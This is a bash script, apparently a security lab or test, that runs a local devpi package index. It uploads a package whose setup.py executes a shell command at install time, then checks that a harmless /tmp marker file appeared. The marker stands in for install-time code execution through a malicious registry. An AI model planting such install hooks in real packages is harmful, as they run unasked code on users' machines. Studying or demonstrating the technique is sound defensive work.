#!/bin/bash
set -e
export PATH="$PATH:$HOME/.local/bin"

function info() {
    echo -e "[*] $1"
}

trap 'info "Stopping devpi-server..."; kill $DEVPI_PID 2>/dev/null; wait $DEVPI_PID 2>/dev/null; info "devpi-server stopped."; exit' SIGINT SIGTERM EXIT

if ! command -v devpi-server &>/dev/null; then
    info "devpi-server not found. Installing devpi-server..."
    pip install devpi-server
fi

if ! command -v devpi &>/dev/null; then
    info "devpi client not found. Installing devpi-client..."
    pip install devpi-client
fi

if [ ! -d "$HOME/.devpi/server" ]; then
    info "Initializing devpi-server data..."
    devpi-init
fi

info "Starting devpi-server on 127.0.0.1:3141..."
devpi-server --host 127.0.0.1 --port 3141 &
DEVPI_PID=$!
info "devpi-server PID: $DEVPI_PID"


info "Waiting for devpi-server to be available..."
until curl -s http://127.0.0.1:3141/+api &>/dev/null; do
    sleep 1
done
info "devpi-server is up and running."


info "Configuring devpi client..."
devpi use http://127.0.0.1:3141 || true


info "Creating user 'attacker' (if not exists)..."
devpi user -c attacker password=malicious123 || info "User 'attacker' already exists, skipping creation."

devpi login attacker --password=malicious123


info "Creating index 'attacker/test' (if not exists)..."
devpi index -c attacker/test || info "Index 'attacker/test' already exists, skipping creation."

devpi use http://127.0.0.1:3141/attacker/test
info "Current devpi index: $(devpi use)"

info "Creating malicious package directory..."
mkdir -p malicious_pkg
cd malicious_pkg


info "Creating setup.py..."
cat > setup.py << 'EOF'
from setuptools import setup
import os

os.system("echo 'Registry Exploitation simulated' > /tmp/registry_exploit.txt")

setup(
    name="vulnerable_pkg",
    version="0.1",
    packages=["malicious_pkg"],
)
EOF

mkdir -p malicious_pkg
touch malicious_pkg/_init_.py

info "Building the package..."
python3 setup.py sdist

info "Uploading the package to the local registry..."
devpi upload

cd ..

info "Installing the malicious package..."
pip install --index-url http://127.0.0.1:3141/attacker/test/ vulnerable_pkg

info "Checking for /tmp/registry_exploit.txt..."
if [ -f /tmp/registry_exploit.txt ]; then
    echo "Exploit file found! Contents:"
    cat /tmp/registry_exploit.txt
else
    echo "Exploit file not found. The simulated malicious action did not execute."
fi

info "Script completed successfully."
